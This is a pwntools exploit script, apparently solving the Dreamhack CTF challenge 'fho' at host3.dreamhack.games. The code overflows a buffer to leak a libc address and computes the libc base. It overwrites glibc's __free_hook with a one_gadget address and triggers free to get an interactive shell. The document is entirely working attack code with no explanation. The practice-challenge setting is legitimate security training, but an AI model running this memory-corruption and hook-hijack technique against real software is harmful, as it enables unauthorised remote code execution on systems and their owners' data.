from pwn import *

p = remote("host3.dreamhack.games", 9620)
e = ELF("./fho")
libc = ELF("./libc-2.27.so")

buf = b"A" * 0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_start_main = u64(p.recvline()[:-1] + b"\x00" * 2)
libc_base = libc_start_main - (libc.symbols["__libc_start_main"] + 231)
free_hook = libc_base + libc.symbols["__free_hook"]
og = libc_base + 0x4f432

p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(og))

p.recvuntil("To free: ")
p.sendline(str(0x31311))

p.interactive()
